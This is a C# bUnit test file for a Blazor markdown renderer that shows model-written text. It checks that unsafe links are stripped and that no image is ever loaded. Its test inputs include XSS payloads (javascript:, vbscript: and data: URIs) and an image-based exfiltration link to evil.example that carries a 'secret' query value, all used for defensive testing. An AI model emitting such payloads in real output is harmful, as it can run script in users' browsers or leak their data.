using Bunit;
using Geef.Atelier.Web.Components.UI;

namespace Geef.Atelier.Tests.Web.Components;

/// <summary>
/// <see cref="MarkdownView"/> shows text written by a model that may carry words of other web pages: links only for http, https and
/// mailto, every other link as its plain text, and no image is ever loaded.
/// </summary>
public sealed class MarkdownViewTests : TestContext
{
    private IRenderedComponent<MarkdownView> Render(string markdown) => RenderComponent<MarkdownView>(p => p.Add(c => c.Markdown, markdown));

    [Fact]
    public void Http_https_and_mailto_links_stay_links()
    {
        var cut = Render("See [the page](https://amt.example/lohn), [old](http://amt.example/alt) and [mail](mailto:info@amt.example).");

        Assert.Equal(["https://amt.example/lohn", "http://amt.example/alt", "mailto:info@amt.example"],
            cut.FindAll("a").Select(a => a.GetAttribute("href")));
    }

    [Theory]
    [InlineData("Click [here](javascript:alert(1)) now.", "here")]
    [InlineData("Click [here](JaVaScRiPt:alert(1)) now.", "here")]
    [InlineData("Click [here](data:text/html;base64,PHNjcmlwdD4=) now.", "here")]
    [InlineData("Click [here](vbscript:msgbox) now.", "here")]
    [InlineData("Click [here](/admin/users) now.", "here")]
    [InlineData("Click [here][r] now.\n\n[r]: javascript:alert(1)", "here")]
    public void Any_other_link_keeps_only_its_text(string markdown, string text)
    {
        var cut = Render(markdown);

        Assert.Empty(cut.FindAll("a"));
        Assert.Contains(text, cut.Find(".md").TextContent, StringComparison.Ordinal);
        Assert.DoesNotContain("javascript", cut.Markup, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("href", cut.Markup, StringComparison.Ordinal);
    }

    [Fact]
    public void An_autolink_with_another_scheme_is_plain_text()
    {
        var cut = Render("Open <javascript:alert(1)> or <https://amt.example/a>.");

        Assert.Equal(["https://amt.example/a"], cut.FindAll("a").Select(a => a.GetAttribute("href")));
        Assert.DoesNotContain("href=\"javascript", cut.Markup, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("![tracking pixel](https://evil.example/p.png?d=secret)")]
    [InlineData("![tracking pixel](//evil.example/p.png)")]
    [InlineData("![tracking pixel](data:image/png;base64,iVBORw0KGgo=)")]
    public void No_image_is_loaded_and_its_alternative_text_stays(string markdown)
    {
        var cut = Render("Before " + markdown + " after.");

        Assert.Empty(cut.FindAll("img"));
        Assert.DoesNotContain("evil.example", cut.Markup, StringComparison.Ordinal);
        Assert.Contains("tracking pixel", cut.Find(".md").TextContent, StringComparison.Ordinal);
    }

    [Fact]
    public void A_linked_image_keeps_the_link_but_never_loads_the_image()
    {
        var cut = Render("[![logo](https://evil.example/logo.png)](https://amt.example/)");

        Assert.Empty(cut.FindAll("img"));
        Assert.Equal("https://amt.example/", cut.Find("a").GetAttribute("href"));
        Assert.Equal("logo", cut.Find("a").TextContent);
    }

    [Fact]
    public void Ordinary_markdown_renders_as_before()
    {
        var cut = Render("# Title\n\nSome **bold** text\nwith a line break.\n\n- one\n- two");

        Assert.Equal("Title", cut.Find("h1").TextContent);
        Assert.Equal("bold", cut.Find("strong").TextContent);
        Assert.Single(cut.FindAll("br"));
        Assert.Equal(2, cut.FindAll("li").Count);
    }
}
